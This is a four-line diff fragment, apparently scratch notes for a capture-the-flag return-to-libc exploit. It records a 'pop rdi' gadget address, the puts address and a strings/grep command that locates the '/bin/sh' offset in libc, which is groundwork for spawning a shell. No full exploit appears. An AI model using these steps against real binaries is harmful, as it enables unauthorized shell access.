@@ -1,0 +1,4 @@
+pop_rdi = 0x400913
+puts = 0x0400540
+strings -a -t x libc.so.6|grep "/bin/sh"
+binsh = 1b40fa
